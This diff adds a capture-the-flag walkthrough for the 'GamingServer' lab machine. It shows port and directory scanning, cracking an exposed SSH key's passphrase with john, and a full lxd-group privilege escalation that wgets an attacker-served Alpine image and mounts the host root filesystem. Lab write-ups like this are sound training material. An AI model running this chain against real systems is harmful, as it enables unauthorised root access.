@@ -1,0 +1,69 @@
+GamingServer
+
+1. NMAP SCAN
+> nmap -sT -sV -p- -oN ./nmap_scan.log <IP>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+2. GOBUSTER SCAN
+> gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+/uploads              (Status: 301) [Size: 314] [--> http://10.10.17.141/uploads/]
+/secret               (Status: 301) [Size: 313] [--> http://10.10.17.141/secret/]
+
+3. GO TO THE WEBSITE
+- on /uploads we find following three files.
+  dict.lst	 
+  manifesto.txt 
+  meme.jpg
+- on /secret we find the ssh key
+
+4. crack the hash
+- so lets use ssh2john and then crack it
+> ssh2john rsa_id > hash
+- we got the hash inside our hash file, now we can crack it with john and the wordlist file from /uploads "dict.lst"
+> john hash dict.lst
+
+5. login to ssh
+!! We find the right username for ssh in the sourcecode from http://<IP>
+> ssh -i rsa_id john@<IP>
+-> now we can read the user.flag
+
+6. get root acces
+> id 
+uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+In Kali:
+
+# git clone  https://github.com/saghul/lxd-alpine-builder.git
+# cd lxd-alpine-builder
+# ./build-alpine
+# python3 -m http.server
+
+On the target:
+
+john@exploitable:/tmp$ wget http://10.8.50.72:8000/alpine-v3.12-x86_64-20200902_1515.tar.gz
+john@exploitable:/tmp$ lxc image list
++-------+-------------+--------+-------------+------+------+-------------+
+| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
++-------+-------------+--------+-------------+------+------+-------------+
+john@exploitable:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200902_1515.tar.gz --alias myimage
+Image imported with fingerprint: 65dd1e31f4cc984602e9be582bf80196cd05d44531b18ad8208ce062f09105ab
+john@exploitable:/tmp$ lxc image list
++---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
+|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
++---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
+| myimage | 65dd1e31f4cc | no     | alpine v3.12 (20200902_15:15) | x86_64 | 3.04MB | Sep 2, 2020 at 1:18pm (UTC) |
++---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
+john@exploitable:/tmp$ lxc init myimage ignite -c security.privileged=true
+Creating ignite
+john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to ignite
+john@exploitable:/tmp$ lxc start ignite
+john@exploitable:/tmp$ lxc exec ignite /bin/sh
+~ # id
+uid=0(root) gid=0(root)
+Now that we are root, let’s get the flag
+> find / -type f -name root.txt 2>/dev/null
+
+
